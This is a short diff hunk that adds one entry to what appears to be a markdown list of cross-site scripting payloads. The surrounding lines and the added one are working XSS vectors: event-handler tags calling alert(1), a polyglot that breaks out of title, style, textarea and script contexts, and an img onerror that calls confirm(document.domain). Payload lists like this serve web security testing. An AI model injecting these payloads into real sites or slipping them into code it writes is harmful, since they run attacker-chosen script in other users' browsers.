@@ -177,6 +177,7 @@
   <th ondblclick="alert(1)" autofocus tabindex=1>test</th>
   <th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
   javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+  ');}</script><img src=q onerror=confirm(document.domain)>
   ```
 </details>
 
